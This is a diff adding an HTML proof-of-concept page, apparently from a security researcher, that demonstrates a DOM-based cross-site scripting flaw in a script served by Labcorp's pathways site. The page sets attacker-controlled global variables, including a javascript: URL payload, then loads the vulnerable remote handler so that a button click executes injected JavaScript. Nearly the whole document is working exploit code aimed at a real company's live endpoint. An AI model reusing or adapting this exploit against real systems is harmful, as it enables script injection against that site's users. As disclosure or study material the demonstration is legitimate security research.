@@ -1,0 +1,62 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Labcorp DOM XSS PoC by xZ3R0D4Yx</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #111;
+      color: #eee;
+      text-align: center;
+      margin-top: 100px;
+    }
+    h1 {
+      color: #f13;
+    }
+    button {
+      padding: 10px 20px;
+      font-size: 18px;
+      background-color: #f13;
+      color: #fff;
+      border: none;
+      border-radius: 5px;
+      cursor: pointer;
+      margin-top: 20px;
+    }
+    iframe {
+      display: block;
+      margin: 30px auto;
+      width: 400px;
+      height: 200px;
+      border: 2px dashed #444;
+    }
+    footer {
+      margin-top: 80px;
+      font-size: 14px;
+      color: #666;
+    }
+  </style>
+
+  <!-- Attacker-controlled globals -->
+  <script>
+    lockoutIFrameUrl = "javascript:alert('XSS by xZ3R0D4Yx')";
+    systemLockoutButtonClientId = "btn";
+    systemLockoutIFrameClientId = "frame";
+  </script>
+
+  <!-- Vulnerable script from Labcorp -->
+  <script src="https://pathways.labcorp.com/Handlers/SessionLockoutHandler.ashx"></script>
+</head>
+
+<body>
+  <h1>Labcorp DOM XSS PoC</h1>
+  <p>This PoC demonstrates JavaScript execution from Labcorp’s .ashx handler using global variable injection.</p>
+  <button id="btn" onclick="OpenLockWindow()">Trigger XSS</button>
+  <iframe id="frame"></iframe>
+
+  <footer>
+    PoC by <strong>xZ3R0D4Yx</strong> • <a href="https://github.com/xZ3R0D4Yx" style="color:#ccc;" target="_blank">GitHub</a>
+  </footer>
+</body>
+</html>
